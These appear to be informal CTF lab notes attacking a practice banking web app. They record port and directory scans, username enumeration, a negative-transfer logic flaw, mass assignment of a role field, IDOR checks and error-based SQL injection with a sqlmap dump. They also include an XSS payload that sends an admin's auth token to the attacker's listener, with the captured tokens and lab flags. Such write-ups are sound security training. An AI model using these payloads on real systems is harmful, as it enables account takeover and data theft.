## nnmap
- block of this command nmap -sV -sC --script vuln 10.200.150.100
- nmap -Pn 10.200.150.100

PORT     STATE SERVICE    VERSION
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
8080/tcp open  http-proxy Werkzeug/3.1.3 Python/3.12.3  **this is api for the app**
...
Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds

## ffuf
ffuf -w /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt   -u http://10.200.150.100:8080/api/v1.0/user   -X POST   -H "Content-Type: application/json"   -H "Accept: application/json"   -H "Origin: http://10.200.150.100"   -H "Referer: http://10.200.150.100/"   -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0"   -d '{"firstname":"User","lastname":"One","username":"FUZZ","email":"FUZZ@test.com","password":"Password123!"}'   -mr "Username already exists"   -c -v

:: Progress: [4/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro[Status: 401, Size: 38, Words: 3, Lines: 2]
| URL | http://10.200.150.100:8080/api/v1.0/user
    * FUZZ: admin

:: Progress: [17/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err[Status: 401, Size: 38, Words: 3, Lines: 2]
| URL | http://10.200.150.100:8080/api/v1.0/user
    * FUZZ: administrator

trying bruforcing admin
using ffuf but i have crafted DOS attack and machine is stuck 



## gobuster :8080
gobuster dir \
  -u http://10.200.150.100:8080/api/v1.0/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --exclude-length 695 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNvbGRhcG9sZGEiLCJyb2xlIjowLCJleHAiOjE3NzI1MjYwNTJ9.du1_k_fRz5JnDY6JZp1vMjtveo_5XgQzgczdFt890Pg" \
  -H "Origin: http://10.200.150.100"

/user                 (Status: 200) [Size: 85] **look at that bro**
/account              (Status: 200) [Size: 3]
/card                 (Status: 200) [Size: 3]
/loan                 (Status: 200) [Size: 3]
/vault                (Status: 200) [Size: 3]
/transaction          (Status: 200) [Size: 3]


## file upload
- no server side file format checking (loading to uploading whatever file)
- encoded in base64 => no ecryption key, whoever can decrypt file
- as file is encoded then doesn't matter the type of file



## User One
user_one
user_one@test.com
password

## User Two
user_two
user_two@test.com
password

## User Three
user_three
user_three@test.com
password


### sing-up
  - added role = 1 MA (OK)
  - SQL_I ()

### sing-in
  - SQL_I ()

### user
  - get (OK)
  - change user details MA **(NOK)**

### account
  - get_list (OK)
  - create account added balance MA (OK)
                                 SQL_I (OK)
  - account?account-number IDOR (OK)
  - account?account-number SQL_I (ok)
  - 1_account_id: 02715204-555c-4943-ba98-776241bb6ee7
  - 2_account_id: d1d4c72d-abd1-46f1-8cfb-89c7ac0be794

### card
  - get_list (OK)
  - create card IDOR (OK)
                SQL_I (OK)
  - 1_card_id: 4777392432505
  - 2_card_id: 30277169229505

### loan
  - get_list (OK)
  - create load added approved, interest MA (OK)
  - loan?loan_number IDOR (OK)
  - loan?loan_number SQL_I (OK)
  - 1_loan_id: e461fa3b-1ff2-4292-8e18-324cf85f71f8
  - 2_load_id: c300c360-cbfa-4cc3-8f68-f9215c7bb124

### vault
  - get_list (OK)
  - create vault SQL_I (OK)
  - vault?vault_number IDOR (OK)
  - vault?vault_number SQL_I (OK)
  - 1_vault_id: 743147f4-457a-414e-ae4b-c0932fe0d565
  - 2_vault_id: f2479c05-feca-438b-841e-5e866c84091a

### transaction
  - get_list (OK)
  - IDOR (OK)


## 1. flag
THM{1953c037-6e16-437b-b045-59b3a41b5c16}

very easy flag
sending transaction on /api/v1.0/transaction i can change the amount number to negative number. then i will not transfer my money to the receiver account but i will get the money from the receiver account. in the UI in /transactions i will then see in red color --10 dolars and minus and minus gives plus so i will receive 10 dolars. on the other hand receiver will see in green +-10 dolars so he will be in minus. also this does not check the amount i send in negative number so i can drai receivers account to very huge negative number.


## 2. flag
/loads/create
- field "purpose of loan" is vulnerable to inserting XSS
- insert this payload
`<img src=x onerror="new Image().src='http://10.250.1.6:4444/?token=' + localStorage.getItem('token');">`
- start web server
`python3 -m http.server 4444`
after admin looks at the loan his auth token appears in console and we can steel his account
root@ip-10-112-77-138:~# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.250.1.6 - - [04/Mar/2026 13:54:28] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXJfdHdvIiwicm9sZSI6MCwiZXhwIjoxNzcyNjMyNzkwfQ.82u2vnnHfdRwdQ-ZAsSks3gtxUGWN6WyRN36sm_tI8o HTTP/1.1" 200 -

exuting comand from thm to get the flag:




10.112.77.138 - - [04/Mar/2026 17:20:11] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXJfdHdvIiwicm9sZSI6MCwiZXhwIjoxNzcyNjQ1Mzc1fQ.rHkWqgyrRnBNo6FGRwzdIDdlbnurQYM4gmDWU52N9qk HTTP/1.1" 200 -
10.200.150.110 - - [04/Mar/2026 17:21:28] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXJfdHdvIiwicm9sZSI6MCwiZXhwIjoxNzcyNjQ1NDg0fQ.sTJDbImSWgBp10gyzSh0YbtyG-d5SQfonf_TIiYzMVs HTTP/1.1" 200 -
^C







## 3. flag
THM{fd3bd92b-11e0-4d35-91de-c0e0a0095bc0}

I have intercepted PUT requset on route /api/v1.0/user that is send from /profile route
there I have tried to do Mass assignement and I have succeded.
form in /profile sends only {"firstname":"User Change","lastname":"One","email":"user_one@test.com"}
from GET /api/v1.0/user i have find out that user has also "role"  parametr set to 0. I assumed that trying it setting to one might give me more privilages.
so in burpsite i added role to intercepted request, set it to one and send PUT request. a flag parametr was returned "flag:THM{fd3bd92b-11e0-4d35-91de-c0e0a0095bc0}"
On same page - /profile is also update password form that uses same PUT API endpoint /api/v1.0/user. Intercepting the API showed that using this strategy to set role to 1 also gave me flat. 
Conclusion is that PUT API call is vulneable




POST /api/v1.0/user HTTP/1.1
Host: 10.200.150.100:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 69
Origin: http://10.200.150.100
Connection: keep-alive
Referer: http://10.200.150.100/
Priority: u=0

{"firstname":"","lastname":"","username":"","email":"","password":""}
i can create account without any credentials, the same thing in login


PUT /api/v1.0/card
trying to do IDOR, inserting number of card that does not belong to user and updating card. api returns status 200 and message: "Card updated" but i dont see updates and in details object is nothing. Vulneable?

35e1aae6-1295-4368-bdba-69854e0864f8


## sql injection
POST /api/v1.0/user HTTP/1.1
Host: 10.200.150.100:8080

{"firstname":"a","lastname":"a","username":"uniquexyz999' AND EXTRACTVALUE(1,concat(0x7e,database()))-- -","email":"test2@b.com","password":"password"}
{"message":"Server error: 1105 (HY000): XPATH syntax error: '~trybankmedbs'"}

{"firstname":"a","lastname":"a","username":"uniquexyz998' AND EXTRACTVALUE(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='trybankmedbs')))-- -","email":"test3@b.com","password":"password"}
"Server error: 1105 (HY000): XPATH syntax error: '~Flags,Users'"

sqlmap -u "http://10.200.150.100:8080/api/v1.0/user" \
>   --data '{"firstname":"a","lastname":"a","username":"test*","email":"test@b.com","password":"password"}' \
>   --method POST \
>   -H "Content-Type: application/json" \
>   -H "Origin: http://10.200.150.100" \
>   --dbms=mysql \
>   --technique=E \
>   -D trybankmedbs -T Flags --dump --batch \
>   --eval="import random,string; username=''.join(random.choices(string.ascii_lowercase,k=10))"| flag                                      |
+-------------------------------------------+
| THM{6a17de51-099a-44e0-94cc-fc67f55ed5b5} |
+-------------------------------------------+






